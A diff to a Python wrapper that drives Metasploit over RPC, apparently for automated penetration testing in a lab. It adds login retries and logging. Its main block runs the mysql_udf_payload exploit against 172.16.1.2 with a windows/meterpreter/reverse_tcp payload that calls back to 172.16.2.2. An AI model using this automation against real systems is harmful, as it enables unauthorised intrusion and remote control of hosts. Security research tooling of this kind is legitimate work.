@@ -2,13 +2,15 @@ import configparser
 import time
 import signal
 import socket
+import datetime
 from pymetasploit3.msfrpc import MsfRpcClient, MsfConsole
 
 from extra_scripts import *
+from json_data_processing_script import Json_monitor
 
 '''
-pymetasploit3.msfrpc has been customised due to the fact that there wa no timeout in the "post_request" definition (which is a little bit silly)
-It is now set at 5.0 seconds.
+pymetasploit3.msfrpc post request has been customised due to the fact that there wa no timeout in the "post_request" definition (which is a little bit silly)
+It is now set at 10.0 seconds.
 
 '''
 
@@ -21,6 +23,9 @@ class Msfrpc:
     def __init__(self):
         # Background color monitor################
         self.color_monitor = Background_printer()
+        ##########################################
+        # Json and Data Monitor###################
+        self.json_and_data_monitor = Json_monitor()
         ##########################################
         config = configparser.ConfigParser()
         try:
@@ -79,7 +84,7 @@ class Msfrpc:
             subprocess.Popen(command_init, stdout=FNULL, stderr=subprocess.STDOUT)
             time.sleep(5)
             subprocess.Popen(command_start, stdout=FNULL, stderr=subprocess.STDOUT)
-            time.sleep(5)
+            time.sleep(10)
             print(self.color_monitor.background_OKGREEN + "[*] Success in launching metasploit" +
                   self.color_monitor.background_ENDC)
         except Exception as e:
@@ -91,18 +96,31 @@ class Msfrpc:
         Method used to establish a RPC Connection
         :return:
         '''
-        try:
-            client = MsfRpcClient(self.service_rpc_password, port=int(self.service_rpc_port), )
-            console = MsfConsole(client)
-            print(self.color_monitor.background_OKGREEN + "[*] Success in login" +
-                  self.color_monitor.background_ENDC)
-            # store client and console you got
-            self.console = console
-            self.client = client
+        for i in range(0, 3):
+            try:
+                client = MsfRpcClient(self.service_rpc_password, port=int(self.service_rpc_port), )
+                console = MsfConsole(client)
+                print(self.color_monitor.background_OKGREEN + "[*] Success in login" +
+                      self.color_monitor.background_ENDC)
+                # store client and console you got
+                self.console = console
+                self.client = client
+                break
 
-        except Exception as e:
-            print(self.color_monitor.background_FAIL + "[x] Failed to login : {}".format(str(e)),
-                  self.color_monitor.background_ENDC)
+            except Exception as e:
+                print(self.color_monitor.background_FAIL + "[x] Failed to login : {}".format(str(e)),
+                      self.color_monitor.background_ENDC)
+
+                # write a log about
+                text = "{} Failed to log in MSFRPC server : {}".format(
+                    datetime.datetime.today().strftime("%d/%m/%Y %H:%M:%S"),
+                    str(e)
+                )
+                self.json_and_data_monitor.write_log(self.json_and_data_monitor.datapath + '/log_file.log',
+                                                     text)
+
+        if self.client is None:
+            raise Exception("Unable to connect to MSFRPC api")
 
     def get_exploits(self):
         '''
@@ -320,7 +338,8 @@ class Msfrpc:
                 ####FOR EACH ITEM OF THE LIST, LOOK IF CHECKMODULE IS IN THE LIST
                 for item in list_of_checkmodule:
                     if 'checkmodule' in item.lower():
-                        checkmodule = list_of_checkmodule[list_of_checkmodule.index(item) + 1].split(' ')[-1] + list_of_checkmodule[list_of_checkmodule.index(item) + 2].split(' ')[-1]
+                        checkmodule = list_of_checkmodule[list_of_checkmodule.index(item) + 1].split(' ')[-1] + \
+                                      list_of_checkmodule[list_of_checkmodule.index(item) + 2].split(' ')[-1]
                         checkmodule = 'auxiliary/scanner' + checkmodule
 
                 ####FINALLY STORE THE DATA
@@ -498,19 +517,22 @@ class Msfrpc:
 
             session_num_list = [*self.client.sessions.list]
             for session_buffer_num in session_num_list:
-                if self.client.sessions.list[str(session_buffer_num)]['via_exploit'] == str(self.current_exploit.fullname):
+                if self.client.sessions.list[str(session_buffer_num)]['via_exploit'] == str(
+                        self.current_exploit.fullname):
                     session_id = session_buffer_num
             session = self.client.sessions.session(str(session_id))
             print(self.color_monitor.background_OKGREEN + "[*] Successfull execution of the exploit" +
                   self.color_monitor.background_ENDC)
         except Exception as e:
-            print(self.color_monitor.background_FAIL + "[x] Failed to execute exploit : {}".format(str(self.current_exploit.fullname)),
+            print(self.color_monitor.background_FAIL + "[x] Failed to execute exploit : {}".format(
+                str(self.current_exploit.fullname)),
                   self.color_monitor.background_ENDC)
 
         if session == -1:
             return -1, -1
         elif len(self.client.sessions.list) == 0:
-            print(self.color_monitor.background_FAIL + "[x] Failed to get a session : {}".format(str(self.current_exploit.fullname)),
+            print(self.color_monitor.background_FAIL + "[x] Failed to get a session : {}".format(
+                str(self.current_exploit.fullname)),
                   self.color_monitor.background_ENDC)
             print(
                 self.color_monitor.background_WARNING + "[!] Exploit or payload might not match or might be badly configured" +
@@ -688,11 +710,15 @@ if __name__ == '__main__':
     env.connection_rpc()
     env.get_exploits()
     # env.run_an_exploit('windows/ftp/ftppad_list_reply')
-    env.run_an_exploit('exploit/multi/misc/java_jmx_server')
+    env.run_an_exploit('exploit/multi/mysql/mysql_udf_payload')
     # options = env.change_option_exploit('CheckModule', 'auxiliary/scanner/smb/smb_ms17_010', 'STR')
     options = env.change_option_exploit('RHOSTS', '172.16.1.2', 'STR')
-    options = env.change_option_exploit('RPORT', 1617 , 'INT')
-    env.run_a_payload('java/meterpreter/reverse_tcp')
+    options = env.change_option_exploit('RPORT', 3306, 'INT')
+    try:
+        options = env.change_option_exploit('SRVPORT', str(15000), 'INT')
+    except Exception :
+        pass
+    env.run_a_payload('windows/meterpreter/reverse_tcp')
     env.change_option_payload('LHOST', '172.16.2.2', 'STR')
     env.change_option_payload('LPORT', 51465, 'INT')
     json, session = env.execute_exploit()
